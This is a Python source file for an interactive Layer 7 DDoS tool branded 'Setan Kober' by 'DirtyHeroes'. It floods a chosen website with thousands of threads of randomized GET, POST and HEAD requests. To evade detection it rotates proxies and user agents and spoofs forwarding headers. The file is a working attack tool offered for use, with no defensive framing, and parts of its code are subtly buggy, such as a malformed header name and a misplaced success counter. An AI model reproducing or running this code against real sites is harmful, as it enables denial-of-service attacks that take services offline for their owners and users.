import os
import sys
import subprocess
import requests
import threading
import random
import time
import socket
import logging
import shutil
from tqdm import tqdm

# List of required Python modules
required_modules = ["requests", "tqdm"]

def install_missing_modules():
    """Check and install missing Python modules automatically."""
    for module in required_modules:
        try:
            __import__(module)  # Try to import the module
        except ImportError:
            print(f"📦 Installing missing module: {module}...")

            try:
                # Install with pip
                subprocess.run([sys.executable, "-m", "pip", "install", module], check=True)
            except subprocess.CalledProcessError:
                print(f"❌ Failed to install {module} using pip. Trying with sudo...")
                if os.name == "posix":  # Linux/macOS
                    subprocess.run(["sudo", sys.executable, "-m", "pip", "install", module], check=True)
                else:
                    print(f"⚠️ Please install {module} manually on Windows.")

# Run installation before importing modules
install_missing_modules()

# Import all required modules
import requests
import logging
from tqdm import tqdm

print("✅ All required modules are installed and imported successfully!")

# Clear the console screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Show a progress bar
def show_progress_bar(duration, length=50):
    print(f"\n⏳ Duration: {duration} sec")

    for i in range(length):
        remaining = duration - int((i / length) * duration)
        mins, secs = divmod(remaining, 60)
        percent = ((i + 1) / length) * 100
        bar = "#" * (i + 1) + " " * (length - i - 1)
        sys.stdout.write(f"\r⏱ {mins:02}:{secs:02} [{bar}] {percent:.2f}%")
        sys.stdout.flush()
        time.sleep(duration / length)

    print("\n✅ Attack Complete! See the summary below...")
    time.sleep(3)

# Print ASCII art centered
def print_centered(ascii_art, width=80):
    columns = shutil.get_terminal_size().columns
    for line in ascii_art.split("\n"):
        print(line.center(columns))

# ASCII art for display
ascii_art = """

 #                                    #
 ##                                  ##
 ###                                ###
 ## #               #              # ##
 ## ##             ###            ## ##
 ##  ##          ### ###         ##  ##
 ##   ##        ##     ##       ##   ##
 ##    ##     ##         ##    ##    ##
 ##     ##   ##           ##  ##     ##
 ##     #####              #####     ##
 ##      ###                ###      ##
 ##     ####                ####     ##
 ##    ##  ##              ##  ##    ##
 ##  ###    ##            ##    ###  ##
 ## ##       ##          ##       ## ##
 ###          ##        ##          ###
 ##            ##      ##            ##
 #              ##    ##              #
 ##  ##
 ####
      ##     

Setan Kober | We Are United | DDOS attack Layer 7

Author: DirtyHeroes

"""


# Resolve the IP address of the target URL
def get_target_ip(url):
    """Resolve the IP address of the target URL."""
    try:
        # Remove protocol and split the domain
        domain = url.split("://")[-1].split("/")[0]
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return None

# Check if the website is active
def check_website_status(url):
    """Check if the website is active."""

    # Automatically add http:// if no scheme is provided
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    try:
        response = requests.get(url, timeout=5)
        return response.status_code == 200
    except (requests.ConnectionError, requests.Timeout):
        return False

# Load proxies from a file
def load_proxies():

    try:
        with open("proxies.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]

    except FileNotFoundError:
        print("⚠️ proxies.txt not found! Running without proxies.")
        return []

PROXY_LIST = load_proxies()

# Test if a proxy is working
def test_proxy(proxy):
    test_urls = ["https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/", "https://duckduckgo.com/"]

    for test_url in test_urls:
        try:
            response = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=3)
            if response.status_code == 200:
                return True
        except:
            continue
    return False

# Load User-Agent strings from a file
def add_useragent():
    useragent_file = "REPLACE_PATH/DDoS-SetanKober/ua.txt"

    try:
        with open(useragent_file, "r") as fp:
            return [line.strip() for line in fp if line.strip()]
    except FileNotFoundError:
        print("[-] No file named 'ua.txt', failed to load User-Agents")
        return []

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    # Add more User-Agents as needed
]

# Different HTTP methods to evade detection
HTTP_METHODS = ["GET", "POST", "HEAD"]

# Create LOG directory if it doesn't exist
LOG_DIR = "LOG"
os.makedirs(LOG_DIR, exist_ok=True)

# Configure logging
LOG_FILE = os.path.join(LOG_DIR, "attack_log.txt")
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

def log_attack(message):
    logging.info(message)

# Function to generate random headers
def random_headers():
    return {
        "User -Agent": random.choice(USER_AGENTS),
        "Referer": random.choice([
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/",
            "https://duckduckgo.com/"
        ]),
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4)),
        "X-Real-IP": ".".join(str(random.randint(0, 255)) for _ in range(4)),
        "Cache-Control": "no-cache"
    }

def play_sound(total_strikes, total_misses):
    print(f"Success Strikes: {total_strikes}, Strike Misses: {total_misses}")
    try:
        subprocess.run(["paplay", "/usr/share/sounds/freedesktop/stereo/bell.oga"], check=True)
    except FileNotFoundError:
        print("🔊 Sound file not found. Skipping bell notification.")
    except subprocess.CalledProcessError:
        print("⚠️ Failed to play sound. Ensure PulseAudio is running.")

def attack(url, ip, threads, duration, proxy_enabled, stealth_mode):
    """Perform the attack on the target URL."""
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)

    clear_screen()
    print_centered(ascii_art)
    total_strikes = 0
    total_misses = 0
    stop_time = time.time() + duration

    print(f"🥷 Stealth mode activated! Traffic will be randomized.")
    print(f"\n🚀 Launching ATTACKS {ip} with {threads} threads for {duration} seconds...")

    # Determine the protocol and port automatically
    if url.startswith("https://"):
        protocol = "https"
        port = 443
    elif url.startswith("http://"):
        protocol = "http"
        port = 80
    else:

        # Default to http if no protocol is specified
        protocol = "http"
        port = 80
        url = "http://" + url  # Prepend http if no protocol is present

    def send_request():
        nonlocal total_strikes, total_misses  

        while time.time() < stop_time:
            proxy = random.choice(PROXY_LIST) if proxy_enabled and PROXY_LIST else None
            proxies = {"http": proxy, "https": proxy} if proxy else None
            headers = random_headers()
            method = random.choice(HTTP_METHODS)

            try:
                if method == "GET":
                    response = requests.get(url, headers=headers, proxies=proxies, timeout=3)
                elif method == "POST":
                    response = requests.post(url, headers=headers, proxies=proxies, timeout=3, data={"param": "value"})
                else:
                    response = requests.head(url, headers=headers, proxies=proxies, timeout=3)
                    total_strikes += 1
                    log_attack(f"[+] {method} Request sent! Status: {response.status_code} | Proxy: {proxy}")
                if stealth_mode:
                    time.sleep(random.uniform(0.1, 0.5))  # Random delay
            
            except requests.exceptions.RequestException:
                total_misses += 1
                log_attack(f"[-] {method} Request failed. Proxy: {proxy}")

    thread_list = []
    with tqdm(total=threads, desc="Starting Threads", bar_format="{l_bar}{bar} {n_fmt}/{total_fmt}") as pbar:
        for i in range(threads):
            try:
                thread = threading.Thread(target=send_request)
                thread.start()
                thread_list.append(thread)
                pbar.update(1)  
            except Exception as e:
                print(f"⚠️ Failed to start thread: {e}")

    show_progress_bar(duration)

    for thread in thread_list:
        thread.join()

    play_sound(total_strikes, total_misses)

    last_attack_summary = (
        f"\n🔥 Attack Summary 🔥\n"
        f"✅ Total Successful Requests (Strikes): {total_strikes}\n"
        f"❌ Total Failed Requests (Misses): {total_misses}\n"
        f"✅ Attack Completed!"
    )

    log_attack(last_attack_summary)
    return last_attack_summary

# Interactive CLI Menu
def main():
    url = ""
    ip = None
    status = None
    threads = 5000
    proxy_enabled = False
    duration = 600
    stealth_mode = False
    last_attack_summary = ""

    while True:
        clear_screen()
        print_centered(ascii_art)
        print("\nCurrent Settings")
        print(f"Target URL          : {url if url else 'Not Set'}")
        print(f"🌐 Target IP        : {ip if ip else 'Not Set'}")
        print(f"🔄 Status           : {'✅ ACTIVE' if status else '❌ NOT Reachable'}" if url else "🔄 Status: Not Set")
        print(f"Threads             : {threads}")
        print(f"Proxy               : {'Enabled' if proxy_enabled else 'Disabled'}")
        print(f"Stealth Mode        : {'Enabled' if stealth_mode else 'Disabled'}")
        print(f"Duration            : {duration} sec")

        if last_attack_summary:
            print("\n🔥 Last Attack Summary 🔥")
            print(last_attack_summary)

        print("\n====== 🎭F^ck Society🎭 ======")
        print("\nMenu:")
        print("1. Input Target URL")
        print("2. Set Threads")
        print("3. Use Proxies")
        print("4. Enable/Disable Stealth Mode")
        print("5. Set Attack Duration")
        print("6. Start Attack")
        print("7. Exit")
        print("\n=============================")

        choice = input("Enter choice: ")

        if choice == "1":
            url = input("Enter target URL: ")        
            if url:
                ip = get_target_ip(url)
                status = check_website_status(url)
                if ip:
                    print(f"🌐 Target IP: {ip}")
                else:
                    print("❌ Could not resolve target IP!")
                if status:
                    print("✅ Website is ACTIVE.")
                else:
                    print("❌ Website is NOT reachable.")
        elif choice == "2":
            threads = int(input("Enter number of threads: "))
        elif choice == "3":
            proxy_enabled = not proxy_enabled
        elif choice == "4":
            stealth_mode = not stealth_mode
            print(f"Stealth Mode {'Enabled' if stealth_mode else 'Disabled'}.")
        elif choice == "5":
            duration = int(input("Enter attack duration in seconds: "))
        elif choice == "6":
            if not url:
                print("⚠️ Target URL is not set!")
            else:
                last_attack_summary = attack(url, ip, threads, duration, proxy_enabled, stealth_mode)
        elif choice == "7":
            print("\n--👿 DDOS Terminated 👿--")
            break
        else:
            print("Invalid choice! Try again.")

if __name__ == "__main__":
    main()
